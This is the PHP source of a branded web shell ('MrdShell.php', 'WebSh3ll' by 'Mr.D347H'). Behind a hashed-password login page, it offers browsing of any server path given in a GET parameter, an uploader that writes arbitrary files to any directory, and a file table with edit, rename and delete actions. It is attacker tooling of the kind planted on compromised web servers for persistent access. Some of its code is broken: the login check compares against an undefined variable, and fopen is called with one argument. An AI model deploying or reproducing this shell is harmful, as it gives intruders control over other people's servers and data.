<?php
session_start();
set_time_limit(0);
error_reporting(0);
@clearstatcache();


$username = "Mr.D347H";
$passwordd = "730fcd5e8d0a62bde4cfec6779f84731";
if (isset($_GET['logout'])) {
	@logout();
}
function logout() {
	unset($_SESSION[@md5($_SERVER['HTTP_HOST'])]);
	@header("Location: http://".$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME']."");
}
function login_shell(){
?>
<link rel="icon" href="http://www.iconarchive.com/download/i91933/icons8/windows-8/User-Interface-Login.ico" sizes="32x32" >
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<title>LOG IN</title>
<style type="text/css">
	img.logout {
	  height: 200px;
	  width: 200px;
		padding:5px;
		border-radius: 50%;
	} input[type=password],input[type=text].logout {
		width:250px;
		text-align:center;
	} input[type=submit],input[type=text].logout {
		width:250px;
		text-align:center;
		margin:5px;
	} span.logout {
		color:#999999;
	} h2 {
		font-family: monospace;
    }
</style>
            <center>
            <br>
            <br>
            <img src="https://media.giphy.com/media/9SvTcpiGueiusdypN6/giphy.gif" class="logout">
            <h2>Mr.D347H</h2>
            <br>
            <h2>SIGN IN</h2>
            <form method="post">
            <input class="form-control logout" type="text" name="username" placeholder="USERNAME">
            <input class="form-control logout" type="password" name="password" placeholder="PASSWORD">
            <input class="btn btn-success logout" type="submit" name="" value="LOGIN">
            </form>
            <span class="logout">Copyright &copy; <?php print @date("Y") ?> - Mr.D347H</span>
            </center>
<?php
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($password) || ( isset($_POST['password']) && (md5($_POST['password']) == $password) ) && (empty($username) || (isset($_POST['username']) && ($_POST['username']) == $username) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
?>
<?php
    if(empty($_GET['path'])){
      $path = @getcwd();
    }else {
      
      $path = $_GET['path'];
    }
    function folderSize ($dir)
{
    $size = 0;

    foreach (glob(rtrim($dir, '/').'/*', GLOB_NOSORT) as $each) {
        $size += is_file($each) ? filesize($each) : folderSize($each);
    }

    return $size;
}
?>
<!DOCTYPE HTML>
<html>
  <head>
    <title>MrD347H Shell</title>
    <link href="https://fonts.googleapis.com/css2?family=Rowdies&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Redressed&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/fontawesome.min.css">
    <style>
      body{
        background: black;
        color: yellow;
      }
      h3{
        color:yellow;
        font-size: 60px;
        font-family: 'Redressed';
      }
      table {
  font-family: arial, sans-serif;
  border-collapse: collapse;
  width: 100%;
}

td, th {
  border:1px solid #dddddd;
  text-align:left;
  padding:8px;
  font-family: 'Rowdies';
}

tr:nth-child(even) {
  background-color:none;
}
.input1{
  width: 50%;
  height: 30px;
  color:yellow;
  background-color: black;
  font-size: 20px;
}
.button_path{
  height: 30px;
  outline: none;
  color: yellow;
  font-size: 20px;
  background-color: black;
}
.input1,.button_path{
  border: none;
  border: 2px solid white;
}
.flink a{
  text-decoration: none;
  color: yellow;
}
    </style>
    
  </head>
  <body>
    <center>
      <img src="https://media.giphy.com/media/9SvTcpiGueiusdypN6/giphy.gif"><br>
      <h3>WebSh3ll</h3>
      <form method="post">
        <label>PWD:<input class="input1" type="text" name="path1" value="<?php echo $path;?>"><input type="submit" name="change_new_path" value="Change Dir" class="button_path"></label>
      </form>
      <?php
      if(isset($_POST['change_new_path'])){
        $path_now = htmlspecialchars($_POST['path1']);
        if(!empty($path)){
          $path = $path_now;
          header("location: MrdShell.php?path=$path");
        }else {
          echo "<script>alert('Empty');</script>";
        }
      }
      ?>
      <?php
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1></h1>";
    }
}echo '<html><head><title>CMD SHELL</title></head><body><center><br><form method=POST enctype="multipart/form-data" action=""><input type=hidden name=path><b><font color=white size=5>Uploader::<label><input type="file" name="files"></label><input type=submit value="Up"></form></body></html>';
?>
      <table>
  <tr>
    <th><i class="fa fa-file"></i>File</th>
    <th>Size</th>
    <th><i class="fa fa-user"></i>Permission</th>
    <th>Action</th>
  </tr>
   <?php
  $file = scandir($path);
  for($i = 0; $i < count($file); $i++) { ?>
  <tr>
    <form method="post">
    <td class=flink><input type="hidden" name="file_name"><a href="MrdShell.php?path=<?php echo $path.'/'.$file[$i]?>"><?= $file[$i]; ?></a> <<</td></form>
    <?php
    try{
    $dir = new DirectoryIterator($file[$i]);
      if ($dir->isFile()) {
      echo "<td>".filesize($file[$i])."</td>";
      }else {
        echo "<td>".folderSize($file[$i])."</td>";
      }
    }
    catch(Exception $e){
      echo "<td>Can't Find the size</td>";
    }
    ?>
    <td><?= fileperms($file[$i]);?></td>
    <td><form method="post"><input type=hidden name=file_name><select name="erd">
      <option value="edit">Edit</option>
      <option value="rename">Rename</option>
      <option value="delete">Delete</option>
    </select><input type="submit" value=">>" name="erdf">
    </td>
  </tr>
  <?php
  $edi = $_GET['edit'];
  if(isset($_POST['erdf'])){
    $file_name = $file[$i];
    fopen($file[$i]);
  }
  ?>
 
  <?php }
  ?>
</table>
    </center>
  </body>
</html>